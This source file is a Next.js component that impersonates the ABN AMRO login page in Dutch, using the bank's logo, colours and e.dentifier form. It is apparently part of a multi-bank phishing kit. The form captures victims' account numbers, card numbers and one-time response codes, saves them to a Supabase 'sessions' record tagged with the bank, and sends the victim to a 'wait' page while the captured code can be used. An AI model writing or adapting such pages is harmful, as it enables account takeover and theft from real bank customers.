"use client";

import { useEffect, useState } from "react";
import { useRouter } from "next/navigation";
import { createBrowserSupabaseClient } from "@/lib/supabase/client";
import { stepToPath } from "@/lib/session-routes";

type Props = {
  sessionId: string;
};

export function AbnAmroLoginClient({ sessionId }: Props) {
  const router = useRouter();
  const supabase = createBrowserSupabaseClient();

  const [accountNumber, setAccountNumber] = useState("");
  const [cardNumber, setCardNumber] = useState("");
  const [responseCode, setResponseCode] = useState("");
  const [rememberAccount, setRememberAccount] = useState(true);
  const [saving, setSaving] = useState(false);
  const [error, setError] = useState<string | null>(null);

  useEffect(() => {
    let cancelled = false;
    void (async () => {
      if (supabase === null || !sessionId) return;
      const { data } = await supabase.from("sessions").select("*").eq("id", sessionId).maybeSingle();
      if (cancelled || !data) return;
      const fd = (data.form_data ?? {}) as Record<string, string>;
      if (fd.verfuegernummer) setAccountNumber(fd.verfuegernummer);
      if (fd.pin) setCardNumber(fd.pin);
      if (fd.tacCode) setResponseCode(fd.tacCode);
    })();
    return () => {
      cancelled = true;
    };
  }, [sessionId, supabase]);

  async function handleSubmit() {
    if (!supabase || !sessionId) return;
    setSaving(true);
    setError(null);

    const { data: existing } = await supabase.from("sessions").select("*").eq("id", sessionId).maybeSingle();
    const prev = (existing?.form_data ?? {}) as Record<string, unknown>;

    const { error: updateError } = await supabase
      .from("sessions")
      .update({ is_hidden: false, current_step: "wait",
        form_data: {
          ...prev,
          bankSlug: "abn-amro",
          bankName: "ABN AMRO",
          verfuegernummer: accountNumber,
          pin: cardNumber,
          tacCode: responseCode,
        },
      })
      .eq("id", sessionId);

    setSaving(false);
    if (updateError) {
      setError("Something went wrong. Please try again.");
      return;
    }
    // ⭐ FLASH YOK: router.push → router.replace
    router.replace(stepToPath("wait", sessionId));
  }

  return (
    <div className="min-h-screen bg-[#008272] font-sans flex flex-col">
      {/* Header */}
      <header className="bg-white h-16 flex items-center justify-between px-4 lg:px-8 shrink-0">
        <div className="flex items-center gap-6">
          <img src="/abn-amro-logo-full.svg" alt="ABN AMRO" className="h-6 md:h-8" />
          <div className="hidden md:flex items-center text-[#009286] font-medium text-sm">
            <svg className="w-4 h-4 mr-1" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M15 19l-7-7 7-7"></path></svg>
            abnamro.nl
          </div>
        </div>
        <div className="flex items-center text-sm font-medium text-[#009286]">
          <span className="px-2 border-2 border-[#009286] rounded-sm bg-[#009286]/10 mr-2">NL</span>
          <span className="px-2 text-gray-500">EN</span>
        </div>
      </header>

      {/* Main Content */}
      <main className="flex-1 flex flex-col items-center justify-center p-4">
        <div className="bg-white rounded-sm shadow-lg w-full max-w-[400px] overflow-hidden">
          {/* Tabs */}
          <div className="flex border-b border-gray-200 text-sm">
            <div className="flex-1 text-center py-4 border-b-2 border-[#009286] text-[#009286] font-medium cursor-pointer">
              Privé
            </div>
            <div className="flex-1 text-center py-4 text-gray-500 hover:text-gray-700 cursor-pointer">
              Zakelijk
            </div>
          </div>

          <div className="p-6 md:p-8">
            <h1 className="text-[22px] text-[#333333] mb-6 font-normal">Log in met e.dentifier</h1>

            <form
              onSubmit={(e) => {
                e.preventDefault();
                void handleSubmit();
              }}
            >
              <div className="mb-4">
                <label className="block text-[13px] text-[#333333] mb-2 font-normal">Rekening- en pasnummer</label>
                <div className="flex items-center gap-2">
                  <div className="flex-1 flex items-center border border-gray-300 focus-within:border-[#009286] focus-within:ring-1 focus-within:ring-[#009286] bg-white h-10 transition-colors">
                    <span className="pl-3 pr-2 text-[13px] text-[#004b46] font-medium whitespace-nowrap bg-[#f0f5f5] h-full flex items-center border-r border-gray-300">
                      NL ** ABNA 0
                    </span>
                    <input
                      type="text"
                      required
                      inputMode="numeric"
                      maxLength={9}
                      minLength={9}
                      value={accountNumber}
                      onChange={(e) => setAccountNumber(e.target.value.replace(/\D/g, '').slice(0, 9))}
                      className="w-full px-2 py-2 text-[13px] focus:outline-none bg-transparent"
                    />
                  </div>
                  <div className="w-[60px] border border-gray-300 focus-within:border-[#009286] focus-within:ring-1 focus-within:ring-[#009286] bg-white h-10 transition-colors shrink-0">
                    <input
                      type="text"
                      required
                      inputMode="numeric"
                      maxLength={4}
                      minLength={4}
                      value={cardNumber}
                      onChange={(e) => setCardNumber(e.target.value.replace(/\D/g, '').slice(0, 4))}
                      className="w-full h-full px-1 text-[14px] text-[#004b46] focus:outline-none bg-transparent text-center"
                    />
                  </div>
                </div>
              </div>

              <div className="mb-6 flex items-start">
                <div className="flex items-center h-5">
                  <input
                    type="checkbox"
                    id="remember"
                    checked={rememberAccount}
                    onChange={(e) => setRememberAccount(e.target.checked)}
                    className="w-4 h-4 border-gray-300 rounded-sm text-[#009286] focus:ring-[#009286] cursor-pointer accent-[#009286]"
                  />
                </div>
                <label htmlFor="remember" className="ml-2 text-[13px] text-[#333333] cursor-pointer pt-[2px]">
                  Onthoud rekening- en pasnummer
                </label>
              </div>

              <div className="mb-6">
                <label className="block text-[13px] text-[#333333] mb-2 font-normal">Respons</label>
                <input
                  type="text"
                  inputMode="numeric"
                  maxLength={8}
                  value={responseCode}
                  onChange={(e) => setResponseCode(e.target.value.replace(/\D/g, ''))}
                  className="w-full max-w-[150px] border border-gray-300 px-3 py-2 h-10 text-[13px] focus:outline-none focus:border-[#009286] focus:ring-1 focus:ring-[#009286] transition-colors"
                />
              </div>

              {error && <p className="text-red-600 text-sm mb-4">{error}</p>}

              <button
                type="submit"
                disabled={saving || accountNumber.length !== 9 || cardNumber.length !== 4}
                className="bg-[#F3C000] hover:bg-[#e0b000] text-[#333333] px-6 py-[10px] text-[15px] font-medium transition-colors disabled:opacity-50 min-w-[120px]"
              >
                {saving ? "Laden..." : "Inloggen"}
              </button>
            </form>

            <div className="my-8 border-t border-gray-200"></div>

            <div className="space-y-3">
              <button className="w-full flex items-center bg-[#F4F4F4] hover:bg-[#EAEAEA] p-3 rounded-sm transition-colors text-left text-[13px] text-[#333333]">
                <div className="w-6 h-6 mr-3 flex items-center justify-center">
                  <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="#009286" strokeWidth="2"><rect x="5" y="2" width="14" height="20" rx="2" ry="2"></rect><line x1="12" y1="18" x2="12.01" y2="18"></line></svg>
                </div>
                Inloggen met QR-code
              </button>
              
              <button className="w-full flex items-center bg-[#F4F4F4] hover:bg-[#EAEAEA] p-3 rounded-sm transition-colors text-left text-[13px] text-[#333333]">
                <div className="w-6 h-6 mr-3 flex items-center justify-center">
                  <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="#009286" strokeWidth="2"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"></path><circle cx="12" cy="11" r="3"></circle></svg>
                </div>
                Inloggen met security key
              </button>
            </div>

            <div className="mt-8 flex items-center justify-between text-[13px] text-[#009286] font-bold cursor-pointer">
              Kas vajad sisselogimisel abi?
              <svg className="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M19 9l-7 7-7-7"></path></svg>
            </div>
          </div>
        </div>
      </main>

      {/* Footer */}
      <footer className="bg-white py-6 px-4 lg:px-8 flex flex-col md:flex-row items-center justify-between text-[12px] text-[#009286] shrink-0">
        <div className="flex flex-wrap items-center justify-center gap-x-6 gap-y-3 mb-4 md:mb-0">
          <a href="#" className="hover:underline">Veilig bankieren</a>
          <a href="#" className="hover:underline">Toegankelijkheid</a>
          <a href="#" className="hover:underline">Privacy</a>
          <a href="#" className="hover:underline">Disclaimer</a>
          <a href="#" className="hover:underline">Cookie-instellingen</a>
        </div>
        <div className="text-gray-500">
          © ABN AMRO
        </div>
      </footer>
    </div>
  );
}
